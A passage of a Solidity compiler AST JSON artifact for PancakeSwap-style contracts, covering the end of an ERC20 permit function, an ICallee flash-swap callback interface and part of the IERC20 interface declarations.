																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 417,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "4308:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			}
																		],
																		"id": 416,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "4300:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 418,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "4300:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"src": "4280:30:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"id": 422,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 420,
																	"name": "recoveredAddress",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 406,
																	"src": "4314:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 421,
																	"name": "owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 358,
																	"src": "4334:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"src": "4314:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "4280:59:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e56414c49445f5349474e4154555245",
															"id": 424,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4353:28:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_861fe3f25593eb07d57a38fb1b6b0f761f16eb1611a0df03954a734d69fb97bf",
																"typeString": "literal_string \"Pancake: INVALID_SIGNATURE\""
															},
															"value": "Pancake: INVALID_SIGNATURE"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_861fe3f25593eb07d57a38fb1b6b0f761f16eb1611a0df03954a734d69fb97bf",
																"typeString": "literal_string \"Pancake: INVALID_SIGNATURE\""
															}
														],
														"id": 414,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "4259:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 425,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4259:132:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 426,
												"nodeType": "ExpressionStatement",
												"src": "4259:132:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 428,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 358,
															"src": "4410:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 429,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 360,
															"src": "4417:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 430,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 362,
															"src": "4426:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 427,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 230,
														"src": "4401:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 431,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4401:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 432,
												"nodeType": "ExpressionStatement",
												"src": "4401:31:0"
											}
										]
									},
									"documentation": null,
									"id": 434,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "permit",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 371,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 358,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3500:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 357,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3500:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 360,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3523:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 359,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3523:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 362,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3548:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 361,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3548:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 364,
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3571:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 363,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3571:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 366,
												"name": "v",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3597:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 365,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "3597:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 368,
												"name": "r",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3614:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 367,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "3614:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 370,
												"name": "s",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3633:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 369,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "3633:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3490:158:0"
									},
									"returnParameters": {
										"id": 372,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3658:0:0"
									},
									"scope": 435,
									"src": "3475:964:0",
									"stateMutability": "nonpayable",
									"superFunction": 718,
									"visibility": "external"
								}
							],
							"scope": 436,
							"src": "111:4330:0"
						}
					],
					"src": "36:4406:0"
				},
				"id": 0
			},
			"src/ICallee.sol": {
				"ast": {
					"absolutePath": "src/ICallee.sol",
					"exportedSymbols": {
						"ICallee": [
							449
						]
					},
					"id": 450,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 437,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:1"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 449,
							"linearizedBaseContracts": [
								449
							],
							"name": "ICallee",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"id": 448,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "pancakeCall",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 446,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 439,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 448,
												"src": "116:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 438,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "116:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 441,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 448,
												"src": "140:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 440,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "140:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 443,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 448,
												"src": "165:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 442,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "165:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 445,
												"name": "data",
												"nodeType": "VariableDeclaration",
												"scope": 448,
												"src": "190:19:1",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 444,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "190:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "106:109:1"
									},
									"returnParameters": {
										"id": 447,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "224:0:1"
									},
									"scope": 449,
									"src": "86:139:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 450,
							"src": "62:165:1"
						}
					],
					"src": "36:192:1"
				},
				"id": 1
			},
			"src/IERC20.sol": {
				"ast": {
					"absolutePath": "src/IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							533
						]
					},
					"id": 534,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 451,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:2"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 533,
							"linearizedBaseContracts": [
								533
							],
							"name": "IERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 459,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 458,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 453,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 459,
												"src": "109:21:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 452,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "109:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 455,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 459,
												"src": "140:23:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 454,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "140:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 457,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 459,
												"src": "173:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 456,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "173:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "99:93:2"
									},
									"src": "85:108:2"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 467,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 466,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 461,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 467,
												"src": "213:20:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 460,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "213:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 463,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 467,
												"src": "235:18:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 462,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "235:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 465,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 467,
												"src": "255:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 464,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "255:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "212:57:2"
									},
									"src": "198:72:2"
								},
								{
									"body": null,
									"documentation": null,
									"id": 472,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 468,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "289:2:2"
									},
									"returnParameters": {
										"id": 471,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 470,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 472,
												"src": "316:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 469,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "316:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "315:15:2"
									},
									"scope": 533,
									"src": "276:55:2",
									"stateMutability": "pure",
									"superFunction": 624,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 477,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 473,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "352:2:2"
									},
									"returnParameters": {
										"id": 476,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 475,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 477,
												"src": "378:13:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 474,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "378:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "377:15:2"
									},
									"scope": 533,
									"src": "337:56:2",
									"stateMutability": "pure",
									"superFunction": 629,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 482,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 478,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "416:2:2"
									},
									"returnParameters": {
										"id": 481,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 480,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 482,
												"src": "442:5:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 479,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "442:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "441:7:2"
									},
									"scope": 533,
									"src": "399:50:2",
									"stateMutability": "pure",
									"superFunction": 634,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 487,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 483,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "475:2:2"
									},
									"returnParameters": {
										"id": 486,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 485,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 487,
												"src": "501:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 484,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "501:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "500:9:2"
									},
									"scope": 533,
									"src": "455:55:2",
									"stateMutability": "view",
									"superFunction": 639,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 494,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 490,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 489,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 494,
												"src": "535:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 488,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "535:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "534:15:2"
									},
									"returnParameters": {
										"id": 493,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 492,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 494,
												"src": "573:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 491,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "573:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "572:9:2"
									},
									"scope": 533,
									"src": "516:66:2",
									"stateMutability": "view",
									"superFunction": 646,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 503,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 499,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 496,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 503,
												"src": "616:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 495,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "616:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 498,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 503,
												"src": "639:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 497,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "639:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "606:54:2"
									},
									"returnParameters": {
										"id": 502,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 501,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 503,
												"src": "684:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 500,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "684:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "683:9:2"
									},
									"scope": 533,
									"src": "588:105:2",
									"stateMutability": "view",
									"superFunction": 655,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 512,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 508,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 505,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 512,
												"src": "716:15:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 504,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "716:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 507,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 512,
												"src": "733:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 506,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "733:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "715:32:2"
									},
									"returnParameters": {
										"id": 511,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 510,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 512,
												"src": "766:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 509,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "766:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "765:6:2"
									},
									"scope": 533,
									"src": "699:73:2",
									"stateMutability": "nonpayable",
									"superFunction": 664,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 521,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 517,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 514,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 521,
												"src": "796:10:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 513,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "796:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 516,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 521,
												"src": "808:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 515,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "808:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "795:27:2"
									},
									"returnParameters": {
										"id": 520,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 519,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 521,
												"src": "841:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 518,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "841:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
